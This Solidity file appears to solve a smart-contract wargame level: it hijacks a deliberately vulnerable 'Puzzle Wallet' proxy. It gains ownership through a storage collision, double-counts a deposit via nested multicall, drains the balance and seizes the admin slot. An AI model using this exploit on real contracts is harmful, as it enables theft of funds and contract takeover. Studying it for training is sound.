// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract PuzzleWalletAttack is Broadcasted {
    function attack(address payable puzzleWalletCtr_) public payable override {
        // propose this contract address as admin (due to storage collision this will
        // set the proposed address as the contract owner)
        IProxyWallet(puzzleWalletCtr_).proposeNewAdmin(address(this));

        // as the current contract is the owner set it in the white list
        IProxyWallet(puzzleWalletCtr_).addToWhitelist(address(this));

        // create a nested call to deposit
        bytes[] memory nestedDepositCall = new bytes[](1);
        nestedDepositCall[0] = abi.encodeWithSelector(
            IProxyWallet.deposit.selector
        );

        // create a multicall to make a deposits
        bytes[] memory calls = new bytes[](2);

        calls[0] = abi.encodeWithSelector(
            IProxyWallet.multicall.selector,
            nestedDepositCall
        );

        // add a multicall to the calls list
        calls[1] = abi.encodeWithSelector(IProxyWallet.deposit.selector);

        // this will deposit twice 0,001 with only one data value (each call make a deposit,
        // first one is nested thats why the depositCalled check is bypassed)
        IProxyWallet(puzzleWalletCtr_).multicall{value: 0.001 ether}(calls);

        // execute with 0.002 ether (even though only 0.001 ether is deposited the mapper will have 0.002 ether)
        // this will drain the contract balance
        IProxyWallet(puzzleWalletCtr_).execute(tx.origin, 0.002 ether, "");

        // set the max balance as the player address (this will set the player as admins due to storage collision)
        IProxyWallet(puzzleWalletCtr_).setMaxBalance(
            uint256(uint160(tx.origin))
        );
    }

    function broadcastedAttack(
        address payable puzzleWalletCtr_
    ) external payable override {
        // intentionally not broadcasted to make calls from this contract
        attack(puzzleWalletCtr_);
    }
}

interface IProxyWallet {
    // ! to hack this contract we need to:
    // ! 1- set the attacker as owner (by setting it as proposed admin)
    // ! 2- drain the contract balance (by by abusing the multicall function and owning the contract balance)
    // ! 3- set the attacker as admin (by setting it as max balance)
    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address _newUser) external;

    function multicall(bytes[] memory _data) external payable;

    function execute(
        address _target,
        uint256 _value,
        bytes memory _data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;

    function deposit() external payable;
}
